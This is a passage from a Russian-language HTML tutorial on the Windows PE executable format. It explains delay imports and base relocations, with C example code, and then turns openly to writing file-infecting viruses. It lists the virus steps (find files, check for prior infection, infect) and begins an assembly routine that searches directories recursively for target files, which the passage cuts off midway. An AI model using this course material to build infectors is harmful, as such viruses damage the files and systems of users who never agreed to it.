&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>grAttrs<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>dwTimeStamp<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pIAT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pINT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pBoundIAT<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">-&gt;</span>pUnloadIAT<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Delay<span style="color: #339933;">++;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<h3><a name="c2n"></a>Особенности импорта на конкретных реализациях загрузчиков</h3>
<p>В разных ОС импорт может быть реализован по-разному. Механизмов - целых 3! И загрузчик вправе выбирать, какой из них, и в каком порядке, в случае провала, будет использован. Загрузчик, например, может сразу просмотреть цепочку директорий и сразу перейти к bound-импорту. Если он валиден, то использовать его для импорта. Если он не корректный, то перейти к стандартному механизму импорта. Т.о., в зависимости от ОС, загрузчик в праве выбирать какой механизм импорта ему использовать. В любом случае Вы можете узнать, как происходит импорт, исследуя поведение загрузчика с помощью дизассемблирования. Но если мы хотим сделать переносимый вирус, то на эти особенности полагаться ни в коем случае нельзя.</p>
<h3><a name="c2o"></a>Базовые поправки</h3>
<p>Если PE-файл не загружается по ImageBase, то применяются базовые поправки. Для данной секции применим особый термин - дельта. Дельта - это разница по модулю между базовым адресом для PE-файла и значением ImageBase в опциональном заголовке. Если файл загрузился по базовому адресу, то базовые поправки не нужны. Чаще EXE файл грузится по своему базовому адресу, но DLL обычно - нет. Базовые поправки - это набор смещений, по которым нужно прибавить дельту. Для базовых поправок часто выделяется отдельная секция .reloc, но они также могут не иметь отдельной секции, а быть частью какой-либо секции. Поправки упаковываются сериями смежных кусков различной длины. Каждый кусок описывает поправки для одной четырехкилобайтовой страницы. Секция базовых поправок начинается с массива структур IMAGE_BASE_RELOCATION, которая выглядит следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_BASE_RELOCATION <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; VirtualAddress<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; SizeOfBlock<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// WORD TypeOffset[1];</span><br />
<span style="color: black;">&#125;</span> IMAGE_BASE_RELOCATION<span style="color: #339933;">;</span><br />
<span style="color: #993333;">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED <span style="color: #339933;">*</span> PIMAGE_BASE_RELOCATION<span style="color: #339933;">;</span><br />
&nbsp;</div>
<dl>
	<dt><strong>DWORD VirtualAddress;</strong></dt><dd>Начальный RVA для данного куска поправок. Смещение каждой поправки, которая следует дальше, добавляется к данной величине для получения RVA, для которого должна быть применена поправка.</dd>
	<dt><strong>DWORD SizeOfBlock;</strong></dt><dd>Размер данной поправки + все последующие поправки типа WORD. Можно определить количество поправок в данном блоке с помощью формулы
		<p>X = (SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2 (6)</p></dd>
	<dt><strong>WORD TypeOffset</strong></dt><dd>Это не одно слово, а массив слов, количество элементов в котором вычисляется с помощью формулы (6). 12 младших разрядов каждого из этих слов представляют поправочное смещение, которое должно быть прибавлено к значению из поля VirtualAddress из данного блока поправок. 4 старших разряда - тип поправки. Для процессоров Intel для типа поправки есть единственное возможное значение - IMAGE_REL_BASED_HIGHLOW. При данном значении к двойному слову по вычисленному адресу смещения прибавляется дельта.</dd>
</dl>
<h3><a name="c2p"></a>Пример работы с базовыми поправками</h3>
<p>Процедура предполагает, что все поправки типа IMAGE_REL_BASED_HIGHLOW.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printRelocTable<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_BASE_RELOCATION&nbsp; Reloc<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_BASE_RELOCATION<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span>IMAGE_DIRECTORY_ENTRY_BASERELOC<span style="color: black;">&#93;</span>.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #202020;">VirtualAddress</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>Reloc<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: #339933;">!=</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> number<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>Reloc<span style="color: #339933;">-&gt;</span>SizeOfBlock<span style="color: #339933;">-</span><span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #0000dd;">2</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WORD<span style="color: #339933;">*</span> Rel<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>WORD <span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Reloc<span style="color: #339933;">+</span><span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Virtual Address: %X<span style="color: #000099; font-weight: bold;">\n</span>Number of Relocation:Relocation<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>Reloc<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>number<span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%d:%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>i<span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #208080;">0x0FFF</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: black;">&#40;</span>Rel<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Reloc<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_BASE_RELOCATION<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Reloc<span style="color: #339933;">-&gt;</span>SizeOfBlock<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Reloc<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<h3><a name="c2r"></a>Программа PE Inside Console Version</h3>
<p>В рамках данной главы я также выкладываю пример работы с PE-файлами консольной программы PE Inside. Просто посмотрите, как это работает и все. Все построено на функциях и макросах и не должно вызвать у Вас проблем. Исходный код находиться в архиве к статье.</p>
<h3><a name="c2s"></a>Программа PE Inside v0.5alfa</h3>
<p>Данная программа демонстрирует работу с PE-файлами. Она была сделана в рамках написания данной главы и имеет открытый исходный код, который Вы можете использовать в своих целях. При первом запуске программа добавляет себя в контекстное меню для PE-файлов, чтобы быстро просмотреть или отредактировать поля PE-файла. Скачать программу и ее исходник можно скачать в архиве прилагаемом к статье. Это только версия 0.5alfa и она мало чего умеет, но далее ее возможности будут расширяться.</p>
<h3><a name="c2t"></a>PE64</h3>
<p>PE64 - это расширение PE32 на случай 64-разрядной платформы. Не бойтесь, изменения между этими форматами минимальны, т.к. все что изменяется - это адреса в памяти. Поэтому все 32-разрядные поля превращаюся в 64-разрядные. В Си для адресации используется тип __int64. Но не забывайте, что в 32-х разрядных процессорах все регистры 32-разрядные по определению. Так что для работы с таким типом используются два регистра. Сами структуры в PE-файле остались прежними. Естественно изменились смещения. Все что Вам понадобиться для работы с этим форматом, так это спецификация Microsoft. А в теории Вы можете опираться на имеющиеся здесь выкладки.</p>
<h3><a name="c2u"></a>Домашнее задание</h3>
<p>Здесь я предлагаю оторваться от чтения и попробовать все прочтенное самому. Единственным способом понять все тонкости PE-формата - это трогать ручками все структуры. Попробуйте написать дамперы соответствующих структур. Откройте hex-редактор и найдите все структуры, попробуйте изменить чего-нибудь etc. Соберите все нужные структуры в один файл. Распечатайте этот документ и повесьте у себя рядом с кроватью. Это приблизит Вас к истинному пониманию структуры PE-файлов. Очень желательно знать все смещения соответствующих структур наизусть, дабы не отстать от Мыша ;)</p>
<h3><a name="c2v"></a>Способы внедрения внутрь исполняемого файла</h3>
<p>Вот мы и добрались до самого главного, т.е. к чему стремились. Все смещения структур PE-файла мы знаем наизусть, знаем как загрузчик работаем с PE-файлами, значит можно заражать файлы. Школьники ходят в школу, учатся, кушают в столовой. Студенты с папочками и с очочками занимаются, а мы пишем вирусы, а все остальное mustdie. Здесь будут рассмотрены более или менее стандартные способы и наиболее простые.</p>
<p>Мы отвлеклись. Вот стандартные действия Windows-вируса:</p>
<ol>
	<li>Поиск файлов для заражения.</li>
	<li>Проверка, не заражен ли уже файл.</li>
	<li>Если нет, то заражаем.</li>
</ol>
<p>Исходя из этих действий выдвигается новая тема. Итак...</p>
<h3><a name="c2w"></a>Поиск файлов</h3>
<p>Когда наш детеныш запускается, то он начинает поиск файлов и соответственно заражение. Обычно вирусы не заражают сразу все файлы, чтобы быть не замеченными. Сейчас мы напишем процедуру, которая ищет файлы. Если находиться директория, то для этого директории рекурсивно вызывается эта же процедура. Рекурсия - это очень интересная вещь в программировании. Мы еще будем обращаться к этому понятию. Т.к. мы программируем в 3 кольце защиты, то в этом кольце для поиска файлов используются три API-функции: FindFirstFile, FindNextFile, FindClose - соответственно начало поиска, продолжение поиска и завершение поиска. Эта процедура похожа на "Танго мастдайное-. Кому надо тот понял. Процедура требует два параметра. Процедура универсальна, сохраняет все регистры. В этом примере я не стал ее оптимизировать. Все что нужно об оптимизации Вы узнаете в соответствующей главе. Но процедура не до конца доделана. Точнее говоря, файлы она ищет все, но ничего не делает с ними. Вы должны добавить всего лишь, что делать с найденными файлами. Чтобы получить имя найденного файла используйте член структуры WIN32_FIND_DATA - cFileName. Чтобы получить путь для этого файла используйте локальную переменную Path. Она следующего вида: &lt;Путь к файлу&gt;0F3h,0F3h,0F3h,0. Где 0F3h и 0 - это байты. Чтобы получить нормальный путь к файлу надо убрать 3 0F3h байта и слить эту строку со строкой содержащей имя файла. В примере немного позже Вы увидите, как это делается. Я добавляю эти лишние байты, для того, чтобы для следующих папок в данной, путь формировался правильно. Эти байты играют роль маски в конце, которая потом удаляется.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;=================================================================</span><br />
<span style="color: black; font-style: italic;">;Процедура FindEXE рекурсивного поиска файлов</span><br />
<span style="color: black; font-style: italic;">;Вход: Dir - адрес ASCIIZ-строки с именем директории где производить поиск</span><br />
<span style="color: black; font-style: italic;">;Mask2 -адрес ASCIIZ-строки &quot;*.*&quot;,0</span><br />
<span style="color: black; font-style: italic;">;=================================================================</span><br />
FindEXE proc Dir<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> Mask2<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; Find<span style="color: #339933;">:</span>WIN32_FIND_DATA<br />
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; hFile<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; Path<span style="color: black;">&#91;</span><span style="color: #ff0000;">1000</span><span style="color: black;">&#93;</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">BYTE</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Обработка переданного пути</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; lstrlen<span style="color: #339933;">,</span>Dir<span style="color: black; font-style: italic;">;вычисляем длину переданного пути</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>Dir<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;получаем в Path - путь для поиска</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>Mask2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Path=Path+Mask+\0</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Find<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; FindFirstFile<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;начало поиска</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>!=INVALID_HANDLE_VALUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;если начало поиска удачно</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hFile<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; FindNextFile<span style="color: #339933;">,</span>hFile<span style="color: #339933;">,</span>ADDR Find&nbsp; &nbsp; <span style="color: black; font-style: italic;">;продолжение поиска</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>WHILE&nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;если продолжение поиска удачно</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Find<span style="color: #339933;">.</span>dwFileAttributes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>FILE_ATTRIBUTE_DIRECTORY<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>Find<span style="color: #339933;">.</span>cFileName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">ebx</span>==FILE_ATTRIBUTE_DIRECTORY<span style="color: black;">&#41;</span> &amp;&amp; <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: black;">&#93;</span>!=<span style="color: #7f007f;">'.'</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Path&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Удаляем '\*.*'</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; lstrlen<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;удаляем маску</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Добавляем имя директории к строке</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>Path<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; lstrlen<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
